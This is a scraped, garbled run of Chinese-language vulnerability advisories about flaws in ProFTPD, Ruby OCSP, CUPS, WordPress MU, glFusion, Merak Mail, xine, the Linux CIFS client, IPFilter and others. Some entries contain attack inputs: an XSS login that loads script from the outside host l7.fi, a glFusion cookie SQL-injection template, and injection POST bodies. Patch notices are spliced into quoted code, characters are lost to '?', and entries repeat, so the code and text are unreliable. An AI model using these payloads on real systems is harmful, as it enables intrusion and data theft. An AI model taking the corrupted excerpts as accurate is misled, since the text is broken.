[ebp+NumberOfBytes], 70h.text:0001161B jbshort loc_11629.text:0001161D mov eax, [ebp+SystemBuffer2].text:00011620 cmp dword ptr [eax+8], 7FFBh.text:00011627 jbe short loc_11638如果本地用户向\\.\hcmon设备发送了0x8101232B IOCTL，就可以导致内核崩溃?      ProFTPD是一款开放源代码FTP服务程序?ProFTPD的SQL认证模块没有正确地处理百分号字符(%)。在mod_sql查询中，可使用百分号表示变量。当mod_sql模块查找到百分号时，就会试图用变量替换，这就改变了基本查询的用户名。例如，对于用户名tj目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<a href=\"http://www.proftpd.org/\" target=\"_blank\" rel=\"nofollow\">http://www.proftpd.org/</a>tring.com，由于会使用FTP响应状态替换百分号，但不存在状态值，因此会使用默认的\"-\"字符串，这个用户名最终变为tj-tring.com?    # patch < /path/to/patch   Ruby是一种功能强大的面向对象的脚本语言?Ruby没有正确地验证X.509证书，在ext/openssl/ossl_ocsp.c文件中以如下方式使用openssl函数?    result = OCSP_basic_verify(bs, x509s, x509st, flg);    sk_X509_pop_free(x509s, X509_free);    if(!result) rb_warn(\"目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：<a href=\"http://www.ruby-lang.org/\" target=\"_blank\" rel=\"nofollow\">http://www.ruby-lang.org/</a>\", ERR_error_string(ERR_peek_error(), NULL));    return result ? Qtrue : Qfalse;OCSP_basic_verify()在出错的情况下可能返??1，因此这个函数可能错误的返回信息。成功利用这个漏洞的攻击者可以导致将已撤销的x.509证书处理为有效，这有助于执行网络钓鱼或站点欺骗攻击?      OpenBSD、NetBSD、FreeBSD都是流行的BSD操作系统，是Unix的衍生系统。OpenBSD、NetBSD、FreeBSD的dtoa实现中存在数组溢出漏洞。在src/lib/libc/gdtoa/gdtoaimp.h中：- ---gdtoaimp.h---...#define Kmax 15...- ---gdtoaimp.h---最大的Kmax长度?5，如果提供了更大的??7)，程序就会溢出freelist数组，bss?x1。以NetBSD为例? ---gdtoaimp.h---...#define Kmax (sizeof(size_t) << 3)...- ---gdtoaimp.h---程序在misc.c中崩溃：- --- src/lib/libc/gdtoa/misc.c ---if ( (rv = freelist[k]) !=0) {freelist[k] = rv->next;}else {x = 1 << k;#ifdef Omit_Private_Memoryrv = (Bigint *)MALLOC(sizeof(Bigint) + (x-1)*sizeof(ULong));#elselen = (sizeof(Bigint) + (x-1)*sizeof(ULong) + sizeof(double) - 1)/sizeof(double);if ((double *)(pmem_next - private_mem + len) <= (double *)PRIVATE_mem){rv = (Bigint*)(void *)pmem_next;pmem_next += len;}elserv = (Bigint*)MALLOC(len*sizeof(double));#endifif (rv == NULL)return NULL;rv->k = k;rv->maxwds = x;}- --- src/lib/libc/gdtoa/misc.c ---这里rv->k = k;或freelist[k] = rv->next;    # patch < /path/to/patch   djbdns是一个由Qmail的作者所设计的轻量级DNS server?djbdns的response.c文件负责处理名称压缩。该文件12行对name_ptr数组有each<16384的标注，但response_addname()没有强制这个限制。如果用户向报文中编码的名称中第一个后缀大于或等?6384字节的话，response_addname()就会错误的编码到名称的偏移，生成畸形的响应报文。这种响应报文会给查询用户误导性信息，有助于攻击者执行中间人等网络欺骗攻击?       可插拔认证模?PAM)是用于认证用户的机制，使用在多种Linux版本上?libpam库在试图认证用户名中包含有unicode/utf-8字符SSH登录请求时没有正确地解析PAM配置文件中的非ascii用户名?pam_misc.c文件62?5?5行的_pam_StrTok函数存在错误的char-gt;int类型转换，如果字符值大?27就会导致出现负数。例如，在pam_misc.c?5行，代码使用end所指向的当前字符值索引空字符table数组?<     } else if (*from) { <         /* simply look for next blank char */ <      for (end=from; *end && !table[(int)*end]; ++end); *end所返回的字符值默认为有符型的，如果使用非ascii字符(大于127，如utf-8字符)，在将其转换为int时会解释为负值。因此，代码?128?27而不??55索引table数组。导致访问表格范围之外或函数栈帧范围之外的内存?       Common Unix Printing System(CUPS)是一款通用Unix打印系统，是Unix环境下的跨平台打印解决方案，基于Internet打印协议，提供大多数PostScript和raster打印机服??在处理包含有两个IPP_TAG_UNSUPPORTED标签的特质IPP时，CUPS的cups/ipp.c文件中的ippReadIO()函数没有正确地初始化ipp结构，这可能导致受影响的应用崩溃 ?cups/ipp.c文件中的ippReadIO()函数负责初始化表示当前IPP请求中不同标签的ipp结构?/-----------1016 ipp_state_t /* O - Current state */1017 ippReadIO(void*src, /* I - Data source */1018 ipp_iocb_tcb, /* I - Read callback function */1019 int blocking, /* I - Use blocking IO? */1020 ipp_t *parent,/* I - Parent request, if any */1021 ipp_t *ipp) /* I - IPP data */1022 {1023 int n;/* Length of data */1024 unsignedchar buffer[IPP_MAX_LENGTH + 1],1025 /* Data buffer */1026 string[IPP_MAX_NAME],1027 /* Small string buffer */1028*bufptr; /* Pointer into buffer */1029ipp_attribute_t*attr; /* Current attribute */1030ipp_tag_t tag; /* Current tag */1031ipp_tag_t value_tag; /* Current value tag */1032ipp_value_t *value;/* Current value */1035DEBUG_printf((\"ippReadIO(%p, %p, %d, %p, %p)\n\", src, cb, blocking,1036parent, ipp));1037DEBUG_printf((\"ippReadIO: ipp->state=%d\n\", ipp->state));1039if (src == NULL || ipp == NULL)1040return (IPP_ERROR);10411042switch (ipp->state)1043{1044case IPP_IDLE :1045ipp->state ++; /* Avoid common problem... */10461047case IPP_HEADER :1048if (parent == NULL)- -----------/在上面的代码中，通过几个不同的标签属性对报文进行计数。如果所发送的IPP报文标签属性低?x10，CUPS就会认为是IPP_TAG_UNSUPPORTED标签?/-----------else if (tag < IPP_TAG_UNSUPPORTED_VALUE){/** Group tag...Set the current group and continue...*/if (ipp->curtag == tag)ipp->prev = ippAddSeparator(ipp);else if (ipp->current)ipp->prev = ipp->current;ipp->curtag= tag;ipp->current = NULL;DEBUG_printf((\"ippReadIO: group tag = %x, ipp->prev=%p\n\", tag,ipp->prev));continue;}- -----------/由于CUPS处理这类标签的方式，如果报文中包含有两个连续的IPP_TAG_UNSUPPORTED，就会将IPP结构的最后一个节点初始化为NULL，这会在cupsdProcessIPPRequest函数试图读取attr结构的name字段时导致崩溃?/-----------/* * &#039;cupsdProcessIPPRequest()&#039; - Process an incoming IPP request. */int /* O - 1 on success, 0 onfailure */cupsdProcessIPPRequest( cupsd_client_t *con)/* I - Client connection */...if (!attr){/** Then make sure that the first three attributes are:** attributes-charset* attributes-natural-language* printer-uri/job-uri*/attr = con->request->attrs;if (attr && !strcmp(attr->name, \"attributes-charset\") &&(attr->value_tag & IPP_TAG_MASK) == IPP_TAG_CHARSET) charset = attr; else charset = NULL; ...- -----------/       WordPress MU允许在单个wordpress安装上运行多个博客?WordPress MU的choose_primary_blog函数没有正确地过滤Host头。以下是wp-includes/wpmu-functions.php中的有漏洞代码段?1830 function choose_primary_blog() {1831     global $current_user;1832     ?>1833     <table class=\"form-table\">1834     <tr>1835         <th scope=\"row\"><?php _e(&#039;Primary Blog&#039;); ?></th>1836         <td>1837         <?php1838         $all_blogs = get_blogs_of_user( $current_user->ID );1839         if( count( $all_blogs ) > 1 ) {1840             $primary_blog = get_usermeta($current_user->ID,&#039;primary_blog&#039;);1841             ?>1842             <select name=\"primary_blog\">1843                 <?php foreach( (array) $all_blogs as $blog ) { ?>1844                     <option value=&#039;<?php echo $blog->userblog_id?>&#039;<?php if( $primary_blog == $blog->userblog_id ) echo &#039;selected=\"selected\"&#039; ?>>http://<?php echo $blog->domain.$blog->path?></option>1845                 <?php } ?>1846             </select>1847             <?php1848         } else {1849             echo $_SERVER[&#039;HTTP_HOST&#039;]; <- HERE1850         }1851         ?>1852         </td>1853     </tr>1854     </table>1855     <?php1856 }?849行的echo $_SERVER[&#039;HTTP_HOST&#039;];，远程攻击者可以通过HTTP Host头注入HTML和脚本代码?       DeluxeBB是一款基于PHP的论坛程序?DeluxeBB的misc.php模块中没有正确地验证用户所提交?qorder参数?    $getsel = $db->query(\"SELECT * FROM \".$prefix.\"users \".$qfilter.\" \".$qorder.\"  <==      \".$sort.\" LIMIT \".$pageinfo[0].\",\".$pageinfo[1]);远程攻击者可以通过提交恶意的查询请求执行SQL注入攻击，导致读取论坛所有注册用户的用户名和口令MD5?      VMWare是一款虚拟PC软件，允许在一台机器上同时运行两个或多个Windows、DOS、LINUX系统?VMWare的hcmon.sys驱动没有过滤用户态通过METHOD_NEITHER发送的指针?.text:00011606 loc_11606:  .text:00011606                 mov     eax, [ebp+SystemBuffer].text:00011609                 mov     [ebp+SystemBuffer2], eax.text:0001160C                 mov     ecx, [ebp+SystemBuffer2].text:0001160F                 mov     edx, [ecx+0Ch]       <---- BUGCHECK.text:00011612                 cmp     edx, [ebp+var_20].text:00011615                 jnz     short loc_11629.text:00011617                 cmp     [ebp+NumberOfBytes], 70h.text:0001161B                 jb      short loc_11629.text:0001161D                 mov     eax, [ebp+SystemBuffer2].text:00011620                 cmp     dword ptr [eax+8], 7FFBh.text:00011627                 jbe     short loc_11638如果本地用户向\\.\hcmon设备发送了0x8101232B IOCTL，就可以导致内核崩溃?      Cisco自适应安全设备(ASA)是可提供安全和VPN服务的模块化平台?ASA的DOM wrapper中存在跨站脚本漏洞?+CSCOL+/cte.js中的csco_wrap_js JavaScript函数调用了CSCO_WebVPN[&#039;process&#039;;]所引用的函数，之后在eval语句中使用了调用的结果：function csco_wrap_js(str){ var ret=\"<script id=CSCO_GHOST src=\"+CSCO_Gateway+ \"/+CSCOL+/cte.js></scr\"+ \"ipt><script id=CSCO_GHOST src=\"+ CSCO_Gateway+\"/+CSCOE+/apcf></sc\"+\"ript>\"; var js_mangled=CSCO_WebVPN[&#039;process&#039;](&#039;js&#039;,str); ret+=CSCO_WebVPN[&#039;process&#039;](&#039;html&#039;,eval(js_mangled)); return ret;};恶意网页可以使用会返回任意值的攻击者定义函数重写CSCO_WebVPN[&#039;process&#039;]，在下一次调用csco_wrap_js函数的时候就会执行恶意代码?      Cisco自适应安全设备(ASA)是可提供安全和VPN服务的模块化平台?在通过ASA的Web VPN请求网页的时候，目标资源类型(scheme)和主机名部分首先Rot13编码，然?6进制编码并放在ASA的URL中?例如，可通过请求以下ASA路径访问http://www.trustwave.com?/+CSCO+0075676763663A2F2F6A6A6A2E67656866676A6E69722E70627A++/显然这个请求的HTML内容经过了ASA的重新格式化?<script id=&#039;CSCO_GHOST&#039; src=\"/+webvpn+/toolbar.js\">但如果修改了请求URL将最初的16进制?0更改?1，就会未经任何重写便返回了HTML文档，这允许在ASA的DOM中运行页面的脚本化内容?      xine是一款免费的媒体播放器，支持多种格式?Xine-lib在解析Quicktime电影文件的畸形STTS原子时存在整数溢出漏洞，本地或远程攻击者可以利用这个漏洞以使用xine库应用程序的权限执行任意代码。以下是/src/demuxers/demux_qt.c中的有漏洞代码段?[...] 840 static qt_error parse_trak_atom (qt_trak *trak, 841 unsigned char *trak_atom) { ... 1535 } else if (current_atom == STTS_ATOM) { 1536 1537 /* there should only be one of these atoms */ 1538 xine是一款免费的媒体播放器，支持多种格式?Xine-lib在解析Quicktime电影文件的畸形STTS原子时存在整数溢出漏洞，本地或远程攻击者可以利用这个漏洞以使用xine库应用程序的权限执行任意代码。以下是/src/demuxers/demux_qt.c中的有漏洞代码段?[...] 840 static qt_error parse_trak_atom (qt_trak *trak, 841                 unsigned char *trak_atom) { ...1535    } else if (current_atom == STTS_ATOM) {15361537      /* there should only be one of these atoms */1538      if (trak->time_to_sample_table) {1539        last_error = QT_HEADER_TROUBLE;1540        goto free_trak;1541      }15421543 [1]  trak->time_to_sample_count = _X_BE_32(&trak_atom[i + 8]);15441545      debug_atom_load(\"     qt stts atom (time-to-sample atom): %d             entries\n\" ,1546        trak->time_to_sample_count);15471548 [2]  trak->time_to_sample_table = (time_to_sample_table_t *)calloc(1549        trak->time_to_sample_count+1, sizeof(time_to_sample_table_t));1550      if (!trak->time_to_sample_table) {1551        last_error = QT_NO_MEMORY;1552        goto free_trak;1553      }15541555      /* load the time to sample table */1556 [3]  for (j = 0; j < trak->time_to_sample_count; j++) {1557 [4]    trak->time_to_sample_table[j].count =1558          _X_BE_32(&trak_atom[i + 12 + j * 8 + 0]);1559 [5]    trak->time_to_sample_table[j].duration =1560          _X_BE_32(&trak_atom[i + 12 + j * 8 + 4]);1561        debug_atom_load(\"       %d: count = %d, duration = %d\n\" ,1562          j, trak->time_to_sample_table[j].count,1563          trak->time_to_sample_table[j].duration);1564      }1565      trak->time_to_sample_table[j].count = 0; /* terminate with zero*/1566    }1567  }[...][1] 使用媒体文件中的用户提供数据填充无符型int变量trak->time_to_sample_count?[2] ?548行和1549行，由于通过trak->time_to_sample_count+1计算出calloc()的第一个参数，因此可能出现整数溢出。用户提供的trak->time_to_sample_count值UINT_MAX(0xffffffff)会触发整数溢出，因此仅分?字节缓冲区?[3] 将trak->time_to_sample_count值用作了这个for()循环的计数器?[4] 将quicktime电影文件中的用户控制数据拷贝到了之前分配的堆缓冲?见[2])。由于将j用作了数组索引，for()循环会一直执行到 j < trak->time_to_sample_count，因此可以用用户控制数据覆盖堆缓冲区?[5] 同[4]       glFusion是一个开源的内容管理系统?glFusion的private/system/lib-session.php模块没有正确地过滤用户所提交的glf_session cookie参数，远程攻击者可以通过向服务器提交恶意请求执行SQL注入攻击。以下是/private/system/lib-session.php?7-117行的有漏洞代码段?    ...    if (isset ($_COOKIE[$_CONF[&#039; cookie_session&#039; ]])) {    $sessid = COM_applyFilter ($_COOKIE[$_CONF[&#039; cookie_session&#039; ]]);    if ($_SESS_VERBOSE) {    COM_errorLog(\" got $sessid as the session id from lib-sessions.php\" ,1);    }    $userid = SESS_getUserIdFromSession($sessid, $_CONF[&#039; session_cookie_timeout&#039; ], $_SERVER[&#039; REMOTE_ADDR&#039; ], $_CONF[&#039; cookie_ip&#039; ]);      if ($_SESS_VERBOSE) {    COM_errorLog(\" Got $userid as User ID from the session ID\" ,1);    }    if ($userid <  1) {    // Check user status    $status = SEC_checkUserStatus($userid);    if (($status == USER_ACCOUNT_ACTIVE) ||    ($status == USER_ACCOUNT_AWAITING_ACTIVATION)) {    $user_logged_in = 1;    SESS_updateSessionTime($sessid, $_CONF[&#039; cookie_ip&#039; ]);?18-436行的SESS_updateSessionTime()函数中：    ...    function SESS_updateSessionTime($sessid, $md5_based=0) {    global $_TABLES;    $newtime = (string) time();    if ($md5_based == 1) {    $sql = \" UPDATE {$_TABLES[&#039; sessions&#039; ]} SET start_time=$newtime WHERE (md5_sess_id = &#039; $sessid&#039; )\" ;  } else {    $sql = \" UPDATE {$_TABLES[&#039; sessions&#039; ]} SET start_time=$newtime WHERE (sess_id = $sessid)\" ; //<-------- SQL INJECTION HERE      }    $result = DB_query($sql);    return 1;    }    ...如果在通用配置中会话id不是md5()哈希(默认配置)，就可以注入SQL语句?在SESS_getUserIdFromSession()函数的查询中?    ...    if ($md5_based == 1) {    $sql = \" SELECT uid FROM {$_TABLES[&#039; sessions&#039; ]} WHERE \"     . \" (md5_sess_id = &#039; $sessid&#039; ) AND (start_time <  $mintime) AND (remote_ip = &#039; $remote_ip&#039; )\" ;  } else {    $sql = \" SELECT uid FROM {$_TABLES[&#039; sessions&#039; ]} WHERE \"     . \" (sess_id = &#039; $sessid&#039; ) AND (start_time <  $mintime) AND (remote_ip = &#039; $remote_ip&#039; )\" ;  }    ...这个查询将所提供的sessid值与从会话表中的sessid?整数)做了比较，而在比较时仅考虑了字符串的第一个整数值，因此函数返回了有效的userid。如果知道了表格中已有的sessid的话，就可以如下在cookie中注入查询：  Cookie: glf_session=12345678 [SQL HERE]; glfusion=9999999999;       glFusion是一个开源的内容管理系统?glFusion的private/system/lib-session.php模块没有正确地过滤用户所提交的glf_session cookie参数，远程攻击者可以通过向服务器提交恶意请求执行SQL注入攻击。以下是/private/system/lib-session.php?7-117行的有漏洞代码段?    ...    if (isset ($_COOKIE[$_CONF[&#039; cookie_session&#039; ]])) {    $sessid = COM_applyFilter ($_COOKIE[$_CONF[&#039; cookie_session&#039; ]]);    if ($_SESS_VERBOSE) {    COM_errorLog(\" got $sessid as the session id from lib-sessions.php\" ,1);    }    $userid = SESS_getUserIdFromSession($sessid, $_CONF[&#039; session_cookie_timeout&#039; ], $_SERVER[&#039; REMOTE_ADDR&#039; ], $_CONF[&#039; cookie_ip&#039; ]);      if ($_SESS_VERBOSE) {    COM_errorLog(\" Got $userid as User ID from the session ID\" ,1);    }    if ($userid <  1) {    // Check user status    $status = SEC_checkUserStatus($userid);    if (($status == USER_ACCOUNT_ACTIVE) ||    ($status == USER_ACCOUNT_AWAITING_ACTIVATION)) {    $user_logged_in = 1;    SESS_updateSessionTime($sessid, $_CONF[&#039; cookie_ip&#039; ]);?18-436行的SESS_updateSessionTime()函数中：    ...    function SESS_updateSessionTime($sessid, $md5_based=0) {    global $_TABLES;    $newtime = (string) time();    if ($md5_based == 1) {    $sql = \" UPDATE {$_TABLES[&#039; sessions&#039; ]} SET start_time=$newtime WHERE (md5_sess_id = &#039; $sessid&#039; )\" ;  } else {    $sql = \" UPDATE {$_TABLES[&#039; sessions&#039; ]} SET start_time=$newtime WHERE (sess_id = $sessid)\" ; //<-------- SQL INJECTION HERE      }    $result = DB_query($sql);    return 1;    }    ...如果在通用配置中会话id不是md5()哈希(默认配置)，就可以注入SQL语句?在SESS_getUserIdFromSession()函数的查询中?    ...    if ($md5_based == 1) {    $sql = \" SELECT uid FROM {$_TABLES[&#039; sessions&#039; ]} WHERE \"     . \" (md5_sess_id = &#039; $sessid&#039; ) AND (start_time <  $mintime) AND (remote_ip = &#039; $remote_ip&#039; )\" ;  } else {    $sql = \" SELECT uid FROM {$_TABLES[&#039; sessions&#039; ]} WHERE \"     . \" (sess_id = &#039; $sessid&#039; ) AND (start_time <  $mintime) AND (remote_ip = &#039; $remote_ip&#039; )\" ;  }    ...这个查询将所提供的sessid值与从会话表中的sessid?整数)做了比较，而在比较时仅考虑了字符串的第一个整数值，因此函数返回了有效的userid。如果知道了表格中已有的sessid的话，就可以如下在cookie中注入查询：  Cookie: glf_session=12345678 [SQL HERE]; glfusion=9999999999;       IBM BladeCenter是IBM的系列高性能刀片服务器?BladeCenter所使用的高级管理模?AMM)的Web管理接口没有正确地过滤用户所提交的输入和请求。如果用户使用恶意的凭据试图登录的话，AMM会在事件日志页面记录用户所提交的凭据，之后管理员查看事件日志时就会执行所注入的内容。例如，攻击者可以使用以下用户名登录导致注入?JavaScript?/script< >script src=\"//l7.fi\"< >/script< >script<      port_0.108.4_all.deb    Ubuntu Ubuntu Linux  8.10 lpia Ubuntu  apport-gtk_0.119.2_all.deb <   HP Deskjet 6840是一款彩色喷墨打印机?HP Deskjet 6840打印机的WEB接口存在跨站脚本漏洞。如果远程攻击者通过POST请求?refresh_rate.htm页面提交了类似于<script>alert(\"found XSS on this page\")</script>的字符串的话，所生成的出错页面就会执行请求中嵌入的脚本?      e107是用php编写的内容管理系统?e107的usersettings.php脚本没有正确地过滤对hide[]密钥所传送的输入，如果magic_quotes_gpc = off的话远程攻击者就可以通过提交恶意请求执行SQL注入攻击。以下是usersettings.php中的有漏洞代码段?433 - 441行：  if($ue_fields) {    $hidden_fields = implode(\"^\", array_keys($_POST[&#039; hide&#039; ])); <------ {1}     if($hidden_fields != \"\")     {     $hidden_fields = \"^\".$hidden_fields.\"^\";       }     $ue_fields .= \", user_hidden_fields = &#039; \".$hidden_fields.\"&#039; \"; <---- {2}   }470 - 476行：  if($ue_fields)   {    [etc..]    $sql->db_Update(\"user_extended\", $ue_fields.\" WHERE user_extended_id = &#039; \".intval($inp).\"&#039; \");  }  ue[] POST变量需要有效的密钥，如aim、msn或其他user_extended_fields(@fields数组)?      Libmodplug是用于播放mod类音乐格式的开源函数库?Libmodplug库的src/load_med.cpp文件中的CSoundFile::ReadMed()函数在加载MED文件时存在可导致堆溢出的整数溢出漏洞，以下是load_med.cpp中的有漏洞代码段?698   // Song Comments699   UINT annotxt = bswapBE32(pmex->;annotxt);700   UINT annolen = bswapBE32(pmex->;annolen);701   if ((annotxt) & &  (annolen) & &  (annotxt+annolen <= dwMemLength))702   {703    m_lpszSongComments = new char[annolen+1];704    memcpy(m_lpszSongComments, lpStream+annotxt, annolen);705    m_lpszSongComments[annolen] = 0;706   }这是个很典型的整数溢出，annolen?xFFFFFFFF(即有符号整数-1)时，导致703行new char[0]。这?字节分配可以成功返回，所以即?03行后加上类似if(m_lpszSongComments){...}的检查代码也无法防范这个漏洞?04行进行memcpy，因为annolen?xFFFFFFFF，导致了堆溢出，触发内存读写越界异常?       Linux Kernel是开放源码操作系统Linux所使用的内核?Linux Kernel的fs/cifs/connect.c文件中的CIFSTCon()函数存在缓冲区溢出漏洞。如果用户受骗连接到了恶意的服务器且服务器向客户端返回了特制的Tree Connect响应的话，就可以出发这个溢出，导致执行任意代码。以下是有漏洞的代码段：3441 int3442 CIFSTCon(unsigned int xid, struct cifsSesInfo *ses,3443          const char *tree, struct cifsTconInfo *tcon,3444          const struct nls_table *nls_codepage)3445 {3446        struct smb_hdr *smb_buffer;3447        struct smb_hdr *smb_buffer_response;3448        TCONX_REQ *pSMB;3449        TCONX_RSP *pSMBr;3450        unsigned char *bcc_ptr;3451        int rc = 0;3452        int length;3453        __u16 count;        ...3458        smb_buffer = cifs_buf_get();        ...3561                if (smb_buffer->;Flags2 &  SMBFLG2_UNICODE) {3562                        length = UniStrnlen((wchar_t *) bcc_ptr, 512);3563                        if ((bcc_ptr + (2 * length)) -3564                             pByteArea(smb_buffer_response) <=3565                            BCC(smb_buffer_response)) {3566                                kfree(tcon->;nativeFileSystem);3567                                tcon->;nativeFileSystem =3568                                    kzalloc(length + 2, GFP_KERNEL);        ...3579                        /* else do not bother copying these information fields*/        ...3606        cifs_buf_release(smb_buffer);3607        return rc;3608 }如果用户所控制的smb_buffer缓冲?3458?为Unicode(3561?，就会使用UniStrnlen()计算其长度。如果长度小于或等于smb_buffer_response的字节数，会使用fs/cifs/cifspdu.h中定义的BCC()宏：416 /* given a pointer to an smb_hdr retrieve the value of byte count */417 #define BCC(smb_var) (*(__u16 *)((char *)smb_var + sizeof(struct smb_hdr) + (2 * smb_var->;WordCount)))418 #define BCC_LE(smb_var) (*(__le16 *)((char *)smb_var + sizeof(struct smb_hdr) + (2 * smb_var->;WordCount)))之后释放所分配的原始文件系统内?3566?，并?568行使用kzalloc()重新分配。这个大小应足够储存unicode字符串，但没有执?length + 1) * 2，而是执行了length + 2，因此分配了不充分的缓冲区?      aMule是一个开源的P2P文件共享程序。aMule的src/DownloadListCtrl.cpp文件执行了以下操作：command = wxT( \"xterm -T \ \"aMule Preview\ \" -iconic -e mplayer &#039;$file&#039; \");[...]wxString rawFileName = file->GetFullName().GetRaw();command.Replace(wxT( \"$file \"), rawFileName);[...]wxExecute(command, wxEXEC_ASYNC, p);尽管通过删除:/<>和其他字符对file->GetFullName()执行了过滤，但既没有转义也没有过滤单引号(&#039;)。如果远程攻击者诱骗用户下载了包含有特制文件名的恶意文件的话，就可能导致注入并执行任意代码?      Google Chrome是Google发布的开源WEB浏览器?Chrome的bool ParamTraits<SkBitmap>::Read(const Message* m, void** iter, SkBitmap*函数在调用bmp_data->InitSkBitmapFromData(r, variable_data, variable_data_size)时存在堆溢出。|bmp_data|与|variable_data|必须彼此保持一致，但没有执行检查。也就是说：memcpy(bitmap->getPixels(), pixels, total_pixels);这里|pixels|和|total_pixels|是受控的数据?      Merak Email Server是一个全面的办公室局域网或Internet通讯邮件解决方案?为了防止在HTML邮件中执行JavaScript和VBScript代码并过滤掉不希望的HTML标签，Merak邮件服务器WebMail模块的cleanHTML()函数会对HTML邮件执行过滤。从462行到482行，cleanHTML()函数删除或更改了各种恶意关键字，包括删除所有以on开始的属?如onmouseover、onload?，并将javascript和vbscript重写为noscript。之后在485行，cleanHTML()函数彻底的删除了邮件中的各种HTML标签?$string = preg_replace(&#039;</*(meta|xml|blink|link|embed|object|iframe|          frame|frameset|ilayer|layer|bgsound)[^>]*>#i&#039;,\"\",$string);在之前过滤掉的关键字之间注入这些HTML标签，cleanHTML()函数就无法识别，之后该函数删除HTML标签时关键字会再次生效?另外一种绕过过滤的方法是使?6进制的HTML实体。cleanHTML()函数?59行对输入字符串进行一次解码：$string = html_entity_decode($string, ENT_COMPAT, \"UTF-8\");通过双重编码输入，所有用于过滤的正则表达式在第一次解码后也无法识别出恶意的内容?      Merak Email Server是一个全面的办公室局域网或Internet通讯邮件解决方案?Merak邮件服务器使用的基于Web的groupware组件允许用户存储联系人信息、标注、文件等。可使用搜索表单搜索所存储的项。当用户使用所提供的表单搜索某些文件时，会从浏览器向以下PHP脚本发送包含有XML搜索查询的HTTP POST请求?https://example.com/webmail/server/webmail.php:----- HTTP POST request ------------------------------------------------<iq sid=\"73aaafec4a8db27af49c4c43bca4ac13\"    uid=\"1239870305230\" type=\"get\" format=\"json\">  <query xmlns=\"webmail:iq:items\">    user@example.com\">      <folder uid=\"Files\">        <item>          <values>            <evntitle> </evntitle>            <evnnote> </evnnote>            [..]          </values>          <filter>            <offset>0</offset>            <limit>60</limit>            <order_by>EVNTYPE asc</order_by>            <sql>(EVNTITLE LIKE &#039;%SQL INJECTION TEST%&#039; OR                   EVNNOTE LIKE &#039;%SQL INJECTION TEST%&#039;)            </sql>          </filter>        </item>      </folder>    </account>  </query></iq>----- /HTTP POST request -----------------------------------------------很明显这里使用了SQL表达式来查找匹配项并对结果排序，其中使用POST请求中所提供的信息创建了两个SQL查询并在数据库中执行(\">\"标记为用户可控部??----- Query 1 ---------------------------------------------------------- Select EVN_ID, EVNRCR_ID, evntitle, evnnote, evnlocation, evnstartdate,        evnstarttime, evntype, evncolor, evncomplete   From Event Where     (EVNGRP_ID = &#039;3a7e072a3002&#039;) And     (       (>        (EVNTITLE LIKE &#039;%SQL INJECTION TEST%&#039; OR>         EVNNOTE LIKE &#039;%SQL INJECTION TEST%&#039;)       ) AND       evnclass <> &#039;O&#039;     ) And     (EvnFolder=&#039;Files&#039;)      Order By>       EVNLOCATION asc     LIMIT 0,45----- /Query 1 -------------------------------------------------------------- Query 2 ---------------------------------------------------------- Select Count(EVN_ID) As Count_ From Event Where   (EVNGRP_ID = &#039;3a7e072a3002&#039;) And   (>    (EVNTITLE LIKE &#039;%SQL INJECTION TEST%&#039; OR>     EVNNOTE LIKE &#039;%SQL INJECTION TEST%&#039;)   ) And   (EvnFolder=&#039;Files&#039;)----- /Query 2 ---------------------------------------------------------仅在两个查询句法都正确的时候数据库才会向web应用返回数据。由于对SQL查询用户可控部分不同的括号嵌套级别，成功的SQL注入要求使用原始HTTP POST请求中的两个元素?      Merak Email Server是一个全面的办公室局域网或Internet通讯邮件解决方案?Merak邮件服务器的WebMail模块在登陆页面提供了\"忘记口令\"取回功能，忘记了登录口令的用户可以在这里向邮件服务器提供他们的邮件地址，之后服务器检查系统中是否存在这个地址并将相关的用户口令发回到这个地址?在点击Forgot Password页面的提交按键时，所发送的HTTP POST请求包含有类似于以下的负载：------------------------------------------------------------------------<iq type=\"set\">  <query xmlns=\"webmail:iq:auth\">    <forgot>invalid@example.com</forgot>    <captcha uid=\"5861146275903694001237908440543\">Z2JK 3WWY</captcha>    <subject>Your password for %EMAIL%</subject>    <message>      Dear %FULLNAME%,      your login data for webmail are following:      Username: %USERNAME%      Password: %PASSWORD%      This email was sent to: %EMAIL%, %ALTEMAIL%.    </message>  </query></iq>------------------------------------------------------------------------邮件的消息内容是由HTTP POST请求而不是服务器端指定的，因此可以控制内容?系统会使用服务器的数据替换掉百分?%)字符之间的变量，识别出以下变量：%FULLNAME%              用户全名(姓和?%USERNAME%, %USER%      用户?%PASSWORD%              用户账号口令%EMAIL%                 邮件地址%ALTEMAIL%              备用邮件地址%REMOTEIP%              服务器的远程IP地址通过向消息的主题中注入换行符，还可以向邮件添加额外的首部。但邮件系统不会解析这些首部，仅会出现在web前端，例如添加额外的To:、Cc:或Bcc:头。添加了这些误导性内容的邮件有助于攻击者执行社会工程学攻击?      IPFilter是一款免费的开放源代码的防火墙程序，由Darren Reed编写，可使用在多种Unix和Linux操作系统平台下?Ippool用于管理IPFilter的IP池子系统中所储存的信息。在IPFilter的lib/load_http.c文件?char buffer[1024])?- ---...alist_t *load_http(char *url){int fd, len, left, port, endhdr, removed;char *s, *t, *u, buffer[1024], *myurl;alist_t *a, *rtop, *rbot;struct sockaddr_in sin;struct hostent *host;/** More than this would just be absurd.*/if (strlen(url) > 512) {fprintf(stderr, \"load_http has a URL > 512 bytes?!\n\");return NULL;}fd = -1;rtop = NULL;rbot = NULL;sprintf(buffer, \"GET 目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<a href=\"http://cvsweb.netbsd.org/bsdweb.cgi/src/dist/ipf/lib/load_http.c?rev=1.2&content-type=text/x-cvsweb-markup&only_with_tag=MAIN\" target=\"_blank\" rel=\"nofollow\">http://cvsweb.netbsd.org/bsdweb.cgi/src/dist/ipf/lib/load_http.c?rev=1.2&content-type=text/x-cvsweb-markup&only_with_tag=MAIN</a> HTTP/1.0\r\n\", url);myurl = strdup(url);if (myurl == NULL)goto done;s = myurl + 7; /* http:// */t = strchr(s, &#039;/&#039;);if (t == NULL) {fprintf(stderr, \"load_http has a malformed URL &#039;&#039;\n\", url);free(myurl);return NULL;}*t++ = &#039;\0&#039;;u = strchr(s, &#039;@&#039;);if (u != NULL)s = u + 1; /* AUTH */sprintf(buffer + strlen(buffer), \"Host: \r\n\r\n\", s);...- ---0. buffer[]仅有1024字节1. url不能大于512字节2. url会被拷贝到以下缓冲区?sprintf(buffer, \"GET  HTTP/1.0\r\n\", url);在这?s是主??sprintf(buffer + strlen(buffer), \"Host: \r\n\r\n\", s);如果url包含有：512 = strlen(http:// A x504 /)则在缓冲区中?strlen(GET HTTP/1.0\r\n) = 15strlen(url) = 512